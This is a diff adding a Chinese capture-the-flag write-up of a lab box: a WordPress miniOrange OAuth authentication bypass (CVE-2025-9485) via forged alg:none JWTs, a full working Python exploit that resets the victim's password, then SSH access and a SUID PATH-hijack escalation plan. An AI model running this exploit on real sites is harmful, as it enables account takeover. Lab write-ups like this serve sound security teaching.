@@ -1,5 +1,438 @@
-<!-- ##{"script":"<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>"}## -->
-<!--encrypt: e08c4f7b-->
-<!--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-->
-<!--/encrypt-->
-遇到问题先自己解决。
+# 信息收集
+
+```bash
+IP=192.168.205.208
+```
+
+对目标做端口和服务探测。
+
+```bash
+nmap -sV -sC -p 22,80,8080 $IP
+```
+
+```
+22/tcp   open  ssh        OpenSSH 10.3
+80/tcp   open  http       Apache/2.4.67 (Unix)
+8080/tcp open  http-proxy
+```
+
+80 是 Apache，8080 访问后发现是 Keycloak 登录页。SSH 版本太新没什么搞头。
+
+访问 80 端口是个 WordPress，域名 `oauth.dsz`，加 hosts。
+
+```bash
+echo "$IP oauth.dsz" >> /etc/hosts
+```
+
+WordPress 登录页有个 "Login with Keycloak" 的 OAuth 按钮，翻源码看看用的什么插件。
+
+```bash
+curl -s http://oauth.dsz/wp-login.php | grep miniorange
+```
+
+```
+/wp-content/plugins/miniorange-login-with-eve-online-google-facebook/css/login-page.min.css?ver=6.26.11
+```
+
+miniOrange OAuth Single Sign On 插件，版本 `6.26.11`。查了一下 WPScan 漏洞库，这个版本命中 CVE-2025-9485（OAuth Single Sign On < 6.26.13 Authentication Bypass）。
+
+触发 OAuth 跳转看一下 OIDC 参数。
+
+```bash
+curl -sI "http://oauth.dsz/?option=oauthredirect&app_name=keycloak"
+```
+
+302 跳到 Keycloak 授权端点，从 Location 里提取到：realm 为 `wordpress-site`，client_id 为 `wordpress-client`，response_type 为 `id_token`，response_mode 为 `form_post`。这些参数构造 payload 时要用到。
+
+# CVE-2025-9485 漏洞利用
+
+## 漏洞原理
+
+正常 OIDC 流程中，WordPress 插件收到 Keycloak 返回的 `id_token` 后，应该用 IdP 的公钥验证 JWT 签名，确认 token 确实由可信的 Keycloak 签发。CVE-2025-9485 的问题在于 miniOrange 插件的 `get_resource_owner_from_id_token()` 函数没有正确校验 JWT 的 `alg` 字段。当攻击者把 JWT header 的 `alg` 设为 `none` 时，插件跳过签名验证，直接信任 payload 里的用户身份信息并下发 WordPress 登录 Cookie。
+
+公开参考仓库：https://github.com/jFriedli/CVE-2025-9485
+
+该仓库给出了通用的理论方向：构造 `alg:none` 的无签名 JWT，把伪造的 `id_token` 提交给 WordPress 回调地址，检查响应中是否出现 `wordpress_logged_in` Cookie。但它是个通用 PoC 草稿，不能直接照搬到当前靶机，原因是：
+
+- 当前靶机使用 `response_mode=form_post`，`id_token` 需要以 POST 表单方式提交到回调地址，不是拼在 URL query 里
+- 必须先触发一次真实的 OAuth 跳转，从中提取插件生成的 `state` 和 `nonce`，否则回调会被拒绝
+- JWT payload 中的 `iss` 必须匹配 `http://oauth.dsz:8080/realms/wordpress-site`，`aud`/`azp` 必须匹配 `wordpress-client`
+
+## 利用流程
+
+手工走一遍完整的利用链：
+
+1. 请求 OAuth 入口，让插件生成会话并拿到 `state` 和 `nonce`：
+
+```bash
+curl -sI "http://oauth.dsz/?option=oauthredirect&app_name=keycloak"
+```
+
+从 302 Location 里提取 `state=xxx&nonce=yyy`。
+
+2. 构造 `alg=none` 的伪造 JWT。header 部分：
+
+```json
+{"typ":"JWT","alg":"none"}
+```
+
+payload 部分（关键字段）：
+
+```json
+{
+  "iss": "http://oauth.dsz:8080/realms/wordpress-site",
+  "aud": "wordpress-client",
+  "azp": "wordpress-client",
+  "preferred_username": "yepian",
+  "email": "yepian@oauth.dsz",
+  "email_verified": true,
+  "nonce": "<从步骤1拿到的nonce>",
+  "exp": <当前时间+3600>
+}
+```
+
+将 header 和 payload 分别 base64url 编码，用 `.` 拼接，末尾再加一个 `.`（空签名），得到最终的 token。
+
+3. POST 到 WordPress 回调：
+
+```
+POST http://oauth.dsz/
+Content-Type: application/x-www-form-urlencoded
+
+id_token=<伪造JWT>&state=<步骤1的state>
+```
+
+4. 响应中出现 `Set-Cookie: wordpress_logged_in_...` 即代表认证绕过成功。
+
+## 自动化利用
+
+整个流程我写成了脚本，保存为 `exp.py`。
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import html
+import json
+import random
+import re
+import secrets
+import string
+import time
+import urllib.parse
+
+import requests
+
+
+R = "\033[91m"
+G = "\033[92m"
+Y = "\033[93m"
+C = "\033[96m"
+B = "\033[1m"
+E = "\033[0m"
+
+
+def b64url(d):
+    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+
+def jwt_none(claims):
+    return b64url(json.dumps({"typ":"JWT","alg":"none"},separators=(",",":")).encode()) + "." + b64url(json.dumps(claims,separators=(",",":")).encode()) + "."
+
+
+def rand_pw():
+    a = string.ascii_letters + string.digits + "!@#$%&*"
+    while True:
+        p = "".join(secrets.choice(a) for _ in range(20))
+        if any(c.islower() for c in p) and any(c.isupper() for c in p) and any(c.isdigit() for c in p) and any(c in "!@#$%&*" for c in p):
+            return p
+
+
+def parse_url(raw):
+    if not raw.startswith("http://") and not raw.startswith("https://"):
+        raw = "http://" + raw
+    p = urllib.parse.urlparse(raw)
+    return p.scheme, p.hostname or "", p.port or (443 if p.scheme == "https" else 80)
+
+
+def get_wp_host(scheme, ip, port):
+    try:
+        base = f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"
+        r = requests.get(base + "/", allow_redirects=False, timeout=8)
+        loc = r.headers.get("Location", "")
+        if loc:
+            p = urllib.parse.urlparse(loc)
+            if p.hostname and p.hostname != ip:
+                return f"{p.hostname}:{p.port}" if p.port and p.port not in (80, 443) else p.hostname
+    except:
+        pass
+    return ip if port in (80, 443) else f"{ip}:{port}"
+
+
+def mkurl(scheme, ip, port, path="/"):
+    return (f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}") + path
+
+
+def check_vuln(s, scheme, ip, port):
+    body = s.get(mkurl(scheme, ip, port, "/wp-login.php"), timeout=10).text
+    body += s.get(mkurl(scheme, ip, port, "/"), timeout=10).text
+    slug = "miniorange-login-with-eve-online-google-facebook"
+    if slug not in body:
+        return None, None
+    ver = re.findall(slug + r"/[^?]+\?ver=([0-9.]+)", body)
+    version = max(ver, key=lambda v: tuple(int(x) for x in v.split("."))) if ver else None
+    if version and tuple(int(x) for x in version.split(".")) >= (6, 26, 13):
+        return version, False
+    apps = list(dict.fromkeys(urllib.parse.unquote(m.group(1)) for m in re.finditer(r"[?&]app_name=([^&'\"<>\s]+)", body)))
+    for a in ["keycloak", "openid", "oauth"]:
+        if a not in apps:
+            apps.append(a)
+    for app in apps:
+        try:
+            r = s.get(mkurl(scheme, ip, port, f"/?option=oauthredirect&app_name={app}"), allow_redirects=False, timeout=10)
+        except:
+            continue
+        if r.status_code in (301, 302, 303, 307, 308) and "openid-connect/auth" in r.headers.get("Location", ""):
+            return version, app
+    return version, None
+
+
+def get_users(s, scheme, ip, port):
+    try:
+        r = s.get(mkurl(scheme, ip, port, "/index.php?rest_route=/wp/v2/users"), timeout=10)
+        data = r.json()
+        if isinstance(data, list):
+            return [u["slug"] for u in data if u.get("slug")]
+    except:
+        pass
+    return []
+
+
+def exploit(s, scheme, ip, port, app, username, email):
+    r = s.get(mkurl(scheme, ip, port, f"/?option=oauthredirect&app_name={app}"), allow_redirects=False, timeout=10)
+    loc = r.headers.get("Location", "")
+    params = {k: v[0] for k, v in urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).items()}
+    parsed = urllib.parse.urlparse(loc)
+    realm = re.search(r"/realms/([^/]+)/", parsed.path)
+    issuer = f"{parsed.scheme}://{parsed.netloc}/realms/{realm.group(1)}" if realm else ""
+    client_id, nonce, state = params.get("client_id", ""), params.get("nonce", ""), params.get("state", "")
+    redirect_uri = params.get("redirect_uri", "/")
+    now = int(time.time())
+    claims = {"iss": issuer, "aud": client_id, "azp": client_id, "sub": f"f-{username}-{random.randint(1000,9999)}", "preferred_username": username, "email": email, "email_verified": True, "name": username, "iat": now, "nbf": now, "exp": now + 3600}
+    if nonce:
+        claims["nonce"] = nonce
+    token = jwt_none(claims)
+    cb = urllib.parse.urlparse(redirect_uri).path or "/"
+    s.post(mkurl(scheme, ip, port, cb), data={"id_token": token, "state": state}, allow_redirects=False, timeout=10)
+    if any(n.startswith("wordpress_logged_in") for n in s.cookies.get_dict()):
+        return True
+    s.get(mkurl(scheme, ip, port, cb + "?" + urllib.parse.urlencode({"id_token": token, "state": state})), allow_redirects=False, timeout=10)
+    return any(n.startswith("wordpress_logged_in") for n in s.cookies.get_dict())
+
+
+def change_pw(s, scheme, ip, port, username, pw):
+    r = s.get(mkurl(scheme, ip, port, "/wp-admin/profile.php"), timeout=10)
+    if r.status_code != 200:
+        return False
+    fields = {}
+    for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.I):
+        fields[m.group(1)] = html.unescape(m.group(2))
+    for m in re.finditer(r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']', r.text, re.I):
+        fields[m.group(2)] = html.unescape(m.group(1))
+    fields.update({"action": "update", "pass1": pw, "pass2": pw, "pw_weak": "on", "submit": "Update Profile"})
+    if not fields.get("display_name"):
+        fields["display_name"] = username
+    r = s.post(mkurl(scheme, ip, port, "/wp-admin/profile.php"), data=fields, allow_redirects=False, timeout=10)
+    return "updated=1" in r.headers.get("Location", "") or "updated=true" in r.headers.get("Location", "")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2025-9485 | miniOrange OAuth Single Sign On < 6.26.13 Authentication Bypass")
+    parser.add_argument("url", help="http://target or target IP")
+    args = parser.parse_args()
+
+    scheme, ip, port = parse_url(args.url)
+    host = get_wp_host(scheme, ip, port)
+    s = requests.Session()
+    s.headers.update({"Host": host})
+
+    print(f"{C}[*]{E} Target: {B}{scheme}://{ip}:{port}{E} (Host: {host})")
+    version, app = check_vuln(s, scheme, ip, port)
+    if app is None:
+        print(f"{R}[-]{E} Not vulnerable. Plugin version: {version or 'not found'}")
+        return
+    print(f"{G}[+]{E} Plugin version: {Y}{version or 'unknown'}{E} | app_name: {Y}{app}{E}")
+    print(f"{G}[+]{E} {R}{B}Vulnerable to CVE-2025-9485{E}")
+
+    users = get_users(s, scheme, ip, port)
+    if not users:
+        print(f"{R}[-]{E} No public users found")
+        u = input(f"{Y}[?]{E} Enter username: ").strip()
+        if not u:
+            return
+        users = [u]
+    else:
+        print(f"{C}[*]{E} Users: {', '.join(users)}")
+        for i, u in enumerate(users):
+            print(f"  {C}[{i}]{E} {u}")
+        c = input(f"{Y}[?]{E} Select user [0-{len(users)-1}]: ").strip()
+        if not c.isdigit() or int(c) >= len(users):
+            return
+        users = [users[int(c)]]
+
+    username = users[0]
+    email = f"{username}@{host.split(':')[0]}"
+    print(f"{C}[*]{E} Exploiting: {B}{username}{E} ({email})")
+
+    if not exploit(s, scheme, ip, port, app, username, email):
+        print(f"{R}[-]{E} Failed, no login cookie")
+        return
+    print(f"{G}[+]{E} {G}Auth bypass success!{E}")
+
+    pw = rand_pw()
+    if change_pw(s, scheme, ip, port, username, pw):
+        print(f"{G}[+]{E} {G}Password changed!{E}")
+        print(f"    {B}URL:{E}      {scheme}://{host}/wp-login.php")
+        print(f"    {B}Username:{E} {username}")
+        print(f"    {B}Password:{E} {R}{pw}{E}")
+    else:
+        print(f"{R}[-]{E} Password change failed")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+跑一下。
+
+```bash
+python3 exp.py http://$IP
+```
+
+```
+[*] Target: http://192.168.205.208:80 (Host: oauth.dsz)
+[+] Plugin version: 6.26.11 | app_name: keycloak
+[+] Vulnerable to CVE-2025-9485
+[*] Users: yepian
+  [0] yepian
+[?] Select user [0-0]: 0
+[*] Exploiting: yepian (yepian@oauth.dsz)
+[+] Auth bypass success!
+[+] Password changed!
+    URL:      http://oauth.dsz/wp-login.php
+    Username: yepian
+    Password: aK7#mR2xLp9&wQ4vBnYs
+```
+
+脚本自动完成了漏洞检测、`state/nonce` 获取、JWT 伪造、回调提交、密码修改全流程。用输出的凭证登录 WordPress 后台。
+
+# WordPress 后台获取 SSH 密钥
+
+进到后台翻文章列表，发现一篇标题为 "My Secret" 的私密文章，内容是完整的 OpenSSH 私钥。保存下来连 SSH。
+
+```bash
+vim id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa yepian@$IP
+```
+
+```
+yepian@Oauth:~$ id
+uid=102(yepian) gid=103(yepian) groups=103(yepian)
+```
+
+拿到 yepian 的 shell。
+
+# 本地提权
+
+## SUID 二进制分析
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+```
+/opt/scripts/CheckSystem
+```
+
+`/opt/scripts/` 下有个 SUID root 的二进制 `CheckSystem`，旁边 plugins 目录下两个 `.sh` 脚本当前用户没有读权限。用 strings 看一下。
+
+```bash
+strings /opt/scripts/CheckSystem | grep "for "
+```
+
+```
+for f in /opt/scripts/plugins/*.sh; do /bin/bash "$f"; done;
+```
+
+把它拖回来反编译确认 main 函数逻辑。
+
+```c
+int main() {
+  setuid(0);
+  setgid(0);
+  system("for f in /opt/scripts/plugins/*.sh; do /bin/bash \"$f\"; done;");
+  return 0;
+}
+```
+
+`setuid(0)` 提到 root 后直接 `system()` 执行 shell 命令，而 `system()` 会继承调用者的 PATH 环境变量。虽然 plugins 目录写不进去，但只要脚本内部调用的命令没用绝对路径就能劫持。
+
